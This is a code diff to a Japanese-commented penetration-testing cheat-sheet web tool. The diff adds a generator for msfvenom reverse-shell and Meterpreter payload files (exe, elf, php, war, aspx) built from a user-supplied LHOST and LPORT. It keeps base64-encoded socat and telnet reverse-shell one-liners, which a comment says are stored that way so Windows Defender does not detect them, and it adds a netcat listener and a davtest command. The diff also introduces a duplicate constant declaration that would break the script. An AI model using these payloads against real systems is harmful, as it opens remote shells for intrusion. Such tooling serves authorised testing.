@@ -8,7 +8,7 @@ $(function () {
   storageInfo = JSON.parse(window.sessionStorage.getItem(STORAGE_KEY));
   const revshlhost = (storageInfo && storageInfo.LHOST) || '10.0.0.1';
   const revshlport = (storageInfo && storageInfo.LPORT) || '4444';
-  const revShell = new RevShell('#mytoolRevShell', ['#revshListener', '#revshList'], {
+  const revShell = new RevShell('#mytoolRevShell', ['#revshListener', '#revshList', '#revshFileList'], {
     'LHOST': '#revshInputLHOST',
     'LPORT': '#revshInputLPORT',
     'SUBMIT': '#revshInputSubmit',
@@ -47,6 +47,20 @@ $(function () {
   recon.setup(reconRhost, reconLport);
   recon.draw(reconRhost, reconLport);
 
+  // --- Setup web application penetration test list ---
+  STORAGE_KEY = 'WEB_ENV';
+  storageInfo = JSON.parse(window.sessionStorage.getItem(STORAGE_KEY));
+  const reconRhost = (storageInfo && storageInfo.RHOST) || '10.0.0.1';
+  const reconLport = (storageInfo && storageInfo.RPORT) || '4444';
+  const recon = new Recon('#mytoolRecon', ['#reconNmapList', '#reconLDAPList'], {
+    'RHOST': '#reconInputRHOST',
+    'RPORT': '#reconInputRPORT',
+    'SUBMIT': '#reconInputSubmit',
+  })
+  recon.STORAGE_KEY = STORAGE_KEY;
+  recon.setup(reconRhost, reconLport);
+  recon.draw(reconRhost, reconLport);
+
 
   // URLのハッシュ(#以降の文字列)で初期表示ページの切り替え
   const myTabButton = document.querySelector(`#myTab button[data-bs-target="${location.hash}"]`);
@@ -68,6 +82,43 @@ class MyTool {
   }
 
   setup(...args) {
+
+    const submit = () => {
+      // 入力項目をinfoに格納する
+      const info = {}
+      for (let i = 0; i < args.length; i++) {
+        const inputCSSSelectorKey = inputCSSSelectorsKeys[i];
+        const inputCSSSelector = this.inputCSSSelectors[inputCSSSelectorKey];
+        const value = $(inputCSSSelector).val().toString();
+
+        info[inputCSSSelectorKey] = value;
+      }
+
+      // 入力項目に1つ以上空白があるか
+      let isAnyEmpty = false;
+      for (const key in info) {
+        if (Object.hasOwnProperty.call(info, key)) {
+          const element = info[key];
+          if (element === undefined || element === "") {
+            isAnyEmpty = true;
+          }
+        }
+      }
+
+      // 入力項目が全て入力されているとき
+      if (!isAnyEmpty) {
+        // Clear
+        for (let i = 0; i < this.targetCSSSelectors.length; i++) {
+          const targetCSSSelector = this.targetCSSSelectors[i];
+          $(targetCSSSelector).empty();
+        }
+        // Create
+        this.draw(...Object.values(info));
+        // Set LHOST and LPORT info into session storage.
+        window.sessionStorage.setItem(this.STORAGE_KEY, JSON.stringify(info));
+      }
+    }
+
     // Set default value
     const inputCSSSelectorsKeys = Object.keys(this.inputCSSSelectors);
     for (let i = 0; i < args.length; i++) {
@@ -93,42 +144,6 @@ class MyTool {
       }
     }
 
-    self = this;
-    function submit() {
-      // 入力項目をinfoに格納する
-      const info = {}
-      for (let i = 0; i < args.length; i++) {
-        const inputCSSSelectorKey = inputCSSSelectorsKeys[i];
-        const inputCSSSelector = self.inputCSSSelectors[inputCSSSelectorKey];
-        const value = $(inputCSSSelector).val().toString();
-
-        info[inputCSSSelectorKey] = value;
-      }
-
-      // 入力項目に1つ以上空白があるか
-      let isAnyEmpty = false;
-      for (const key in info) {
-        if (Object.hasOwnProperty.call(info, key)) {
-          const element = info[key];
-          if (element === undefined || element === "") {
-            isAnyEmpty = true;
-          }
-        }
-      }
-
-      // 入力項目が全て入力されているとき
-      if (!isAnyEmpty) {
-        // Clear
-        for (let i = 0; i < self.targetCSSSelectors.length; i++) {
-          const targetCSSSelector = self.targetCSSSelectors[i];
-          $(targetCSSSelector).empty();
-        }
-        // Create
-        self.draw(...Object.values(info));
-        // Set LHOST and LPORT info into session storage.
-        window.sessionStorage.setItem(self.STORAGE_KEY, JSON.stringify(info));
-      }
-    }
   }
 
   draw(...args) {
@@ -188,6 +203,20 @@ class MyTool {
   }
 }
 
+class Web extends MyTool {
+  constructor(...args) {
+    super(...args);
+
+    this.targetContents['1'] = [
+      {'title': '', 'cmd': 'davtest -url "{0}"'},
+    ]
+  }
+
+  drawList(index, targetContent, url) {
+    //
+  }
+}
+
 // ---- Reverse Shell ----------------------------------------------------------
 class RevShell extends MyTool {
   constructor(...args) {
@@ -196,7 +225,7 @@ class RevShell extends MyTool {
     // 1. Listen
     this.targetContents['1.Listen'] = [
       {'title': '@Kali (netcat)', 'cmd': 'nc -lnvp {0}'},
-    ]
+    ];
 
     // 2. Connect back
     // ローカル開発時にWindows Definderに検知されないようにBase64で保存すること。
@@ -236,7 +265,21 @@ class RevShell extends MyTool {
       {'title': 'socat', 'base64': 'c29jYXQgZXhlYzonYmFzaCAtbGknLHB0eSxzdGRlcnIsc2V0c2lkLHNpZ2ludCxzYW5lIHRjcDp7MH06ezF9'},
       {'title': 'socat (Windows)', 'base64': 'c29jYXQuZXhlIC1kIC1kIFRDUDQ6ezB9OnsxfSBFWEVDOidjbWQuZXhlJyxwaXBlcw=='},
       {'title': 'telnet', 'base64': 'cm0gLWYgL3RtcC9wOyBta25vZCAvdG1wL3AgcCAmJiB0ZWxuZXQgezB9IHsxfSAwL3RtcC9w'},
-    ]
+    ];
+
+    // 3. Reverse Shell Files
+    this.targetContents['3.ReverseShellFiles'] = [
+      {'title': 'Windows', 'cmd': 'msfvenom -p windows/shell_reverse_tcp LHOST={0} LPORT={1} -f exe > win_rshell_{0}_{1}.exe'},
+      {'title': 'Linux', 'cmd': 'msfvenom -p linux/x86/shell_reverse_tcp LHOST={0} LPORT={1} -f elf > lin_rshell_{0}_{1}.elf'},
+      {'title': 'PHP', 'cmd': 'msfvenom -p php/reverse_php LHOST={0} LPORT={1} -f raw > php_rshell_{0}_{1}.php'},
+      {'title': 'Java', 'cmd': 'msfvenom -p java/jsp_shell_reverse_tcp LHOST={0} LPORT={1} -f raw > war_rshell_{0}_{1}.war'},
+      {'title': 'ASPX', 'cmd': 'msfvenom -p windows/shell_reverse_tcp LHOST={0} LPORT={1} -f aspx > aspx_rshell_{0}_{1}.aspx'},
+      {'title': 'Meterpreter: Windows', 'cmd': 'msfvenom -p windows/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f exe > win_met_{0}_{1}.exe'},
+      {'title': 'Meterpreter: Linux', 'cmd': 'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f elf > lin_met_{0}_{1}.elf'},
+      {'title': 'Meterpreter: PHP', 'cmd': 'msfvenom -p php/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f raw > php_met_{0}_{1}.php'},
+      {'title': 'Meterpreter: Java', 'cmd': 'msfvenom -p java/meterpreter/reverse_http LHOST={0} LPORT={1} -f raw > war_met_{0}_{1}.war'},
+      {'title': 'Meterpreter: ASPX', 'cmd': 'msfvenom -p windows/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f aspx > aspx_met_{0}_{1}.aspx'},
+    ];
   }
 
   drawList(index, targetContent, lhost, lport) {
